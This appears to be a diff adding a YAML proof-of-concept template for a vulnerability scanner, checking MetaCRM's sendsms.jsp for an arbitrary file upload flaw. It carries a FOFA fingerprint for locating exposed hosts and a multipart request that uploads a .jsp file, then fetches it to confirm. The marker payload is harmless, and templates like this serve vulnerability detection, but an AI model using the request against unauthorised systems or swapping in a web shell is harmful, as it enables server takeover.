@@ -1,0 +1,34 @@
+id: poc-yaml-metacrm-sendsms-jsp-anyfile-upload
+info:
+  name: MetaCRM客户关系管理系统 sendsms.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /business/common/sms/sendsms.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: "status_code == 200 && \ncontains(body,\"userfile\") &&\ncontains(body,\"\
+    .jsp\")\n"
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{32}).jsp")
+- method: GET
+  path: /userfile/temp/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
